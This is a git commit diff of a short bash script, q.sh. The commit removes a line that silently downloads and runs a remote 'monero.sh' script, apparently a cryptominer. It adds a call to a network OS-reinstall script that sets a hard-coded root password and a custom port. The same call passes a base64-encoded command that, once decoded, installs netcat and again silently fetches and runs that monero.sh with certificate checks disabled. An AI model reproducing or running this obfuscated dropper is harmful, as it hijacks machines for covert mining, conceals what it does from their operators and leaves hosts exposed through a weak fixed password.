124d590ef4a22c2e36ce9ffb24f462ee3364467c
jl825741 <121535687+jl825741@users.noreply.github.com>
2025-03-11 08:58:55 +0800

    Update q.sh

--- q.sh
+++ q.sh
@@ -1,3 +1,8 @@
 #!/bin/bash
 
-bash <(wget --no-check-certificate -qO- https://raw.githubusercontent.com/jl825741/zhigengniao/main/monero.sh) >/dev/null 2>&1 &
+
+sleep 120
+#sleep "$[od -An -N2 -i /dev/urandom % 10800 + 10800]"
+
+
+bash <(wget --no-check-certificate -qO- https://raw.githubusercontent.com/MoeClub/Note/master/InstallNET.sh) -d 12 -v 64 -a -p "Ls.123456" -port 2233 -cmd "IyEvYmluL2Jhc2gKIyBEZWJpYW4xMisKc3VkbyBhcHQgLXFxeSB1cGRhdGUgPi9kZXYvbnVsbCAyPiYxIHx8IGFwdCAtcXF5IHVwZGF0ZSA+L2Rldi9udWxsIDI+JjEKc3VkbyBhcHQgLXFxeSBpbnN0YWxsIHdnZXQgcHJvY3BzIHBzbWlzYyBsc29mIGNyb24gaWN1LWRldnRvb2xzIG5ldGNhdC10cmFkaXRpb25hbCBiaW5kOS1ob3N0ID4vZGV2L251bGwgMj4mMSB8fCBhcHQgLXFxeSBpbnN0YWxsIHdnZXQgcHJvY3BzIHBzbWlzYyBsc29mIGNyb24gaWN1LWRldnRvb2xzIG5ldGNhdC10cmFkaXRpb25hbCBiaW5kOS1ob3N0ID4vZGV2L251bGwgMj4mMQpiYXNoIDwod2dldCAtLW5vLWNoZWNrLWNlcnRpZmljYXRlIC1xTy0gaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2psODI1NzQxL3poaWdlbmduaWFvL21haW4vbW9uZXJvLnNoKSA+L2Rldi9udWxsIDI+JjEgJg=="
